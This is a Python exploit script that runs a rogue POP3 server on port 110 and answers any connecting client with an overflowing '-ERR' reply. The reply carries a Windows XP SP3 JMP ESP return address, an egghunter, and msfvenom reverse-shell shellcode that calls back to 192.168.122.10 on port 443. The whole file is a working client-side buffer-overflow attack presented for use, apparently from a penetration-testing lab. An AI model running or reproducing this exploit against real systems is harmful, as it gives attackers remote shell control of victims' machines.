#!/usr/bin/env python

import socket

# egg: timo
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x74\x69\x6d\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
#  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.10 LPORT=443 -f c -b "\x00\xd9"
shellcode = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
        "\xba\xbe\x36\x87\x83\xee\xfc\xe2\xf4\x46\x56\xb4\x87\xba\xbe"
        "\x56\x0e\x5f\x8f\xf6\xe3\x31\xee\x06\x0c\xe8\xb2\xbd\xd5\xae"
        "\x35\x44\xaf\xb5\x09\x7c\xa1\x8b\x41\x9a\xbb\xdb\xc2\x34\xab"
        "\x9a\x7f\xf9\x8a\xbb\x79\xd4\x75\xe8\xe9\xbd\xd5\xaa\x35\x7c"
        "\xbb\x31\xf2\x27\xff\x59\xf6\x37\x56\xeb\x35\x6f\xa7\xbb\x6d"
        "\xbd\xce\xa2\x5d\x0c\xce\x31\x8a\xbd\x86\x6c\x8f\xc9\x2b\x7b"
        "\x71\x3b\x86\x7d\x86\xd6\xf2\x4c\xbd\x4b\x7f\x81\xc3\x12\xf2"
        "\x5e\xe6\xbd\xdf\x9e\xbf\xe5\xe1\x31\xb2\x7d\x0c\xe2\xa2\x37"
        "\x54\x31\xba\xbd\x86\x6a\x37\x72\xa3\x9e\xe5\x6d\xe6\xe3\xe4"
        "\x67\x78\x5a\xe1\x69\xdd\x31\xac\xdd\x0a\xe7\xd6\x05\xb5\xba"
        "\xbe\x5e\xf0\xc9\x8c\x69\xd3\xd2\xf2\x41\xa1\xbd\x41\xe3\x3f"
        "\x2a\xbf\x36\x87\x93\x7a\x62\xd7\xd2\x97\xb6\xec\xba\x41\xe3"
        "\xd7\xea\xee\x66\xc7\xea\xfe\x66\xef\x50\xb1\xe9\x67\x45\x6b"
        "\xa1\xed\xbf\xd6\xf6\x2f\xc0\xb4\x5e\x85\xba\xbf\x8d\x0e\x5c"
        "\xd4\x26\xd1\xed\xd6\xaf\x22\xce\xdf\xc9\x52\x3f\x7e\x42\x8b"
        "\x45\xf0\x3e\xf2\x56\xd6\xc6\x32\x18\xe8\xc9\x52\xd2\xdd\x5b"
        "\xe3\xba\x37\xd5\xd0\xed\xe9\x07\x71\xd0\xac\x6f\xd1\x58\x43"
        "\x50\x40\xfe\x9a\x0a\x86\xbb\x33\x72\xa3\xaa\x78\x36\xc3\xee"
        "\xee\x60\xd1\xec\xf8\x60\xc9\xec\xe8\x65\xd1\xd2\xc7\xfa\xb8"
        "\x3c\x41\xe3\x0e\x5a\xf0\x60\xc1\x45\x8e\x5e\x8f\x3d\xa3\x56"
        "\x78\x6f\x05\xc6\x32\x18\xe8\x5e\x21\x2f\x03\xab\x78\x6f\x82"
        "\x30\xfb\xb0\x3e\xcd\x67\xcf\xbb\x8d\xc0\xa9\xcc\x59\xed\xba"
        "\xed\xc9\x52")
numAs = 709
# ret 0x7E429353 jmp esp Windows XP SP3 english
ret = "\x53\x93\x42\x7e"
sploit = "A"*numAs + ret + egghunter + "timotimo" + shellcode + "\r\n"
payload = "-ERR " + sploit

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 110))
    s.listen(1)
    print("[*] Listening on port 110")
    c, a = s.accept()
    print("[*] Received connection from " + str(a[0]))
    c.send(payload)
    print("[*] " + str(len(sploit)) + " bytes sent")
    numAs += 10
    #c.close()
except Exception as e:
    print("[-] Error: " + repr(e))
